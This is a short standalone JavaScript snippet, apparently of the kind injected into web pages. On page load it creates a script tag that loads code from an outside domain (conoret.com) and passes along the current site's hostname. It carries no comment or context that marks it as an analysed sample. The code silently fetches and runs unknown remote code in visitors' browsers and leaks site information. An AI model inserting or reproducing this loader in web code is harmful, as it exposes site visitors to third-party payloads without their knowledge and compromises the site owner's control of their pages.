window.top === window && !function () { 
    var e = document.createElement("script"); 
    var t = document.getElementsByTagName("head")[0]; 
    e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(),
    e.type = "text/javascript", 
    e.defer = !0, 
    e.async = !0, 
    t.appendChild(e) 
}();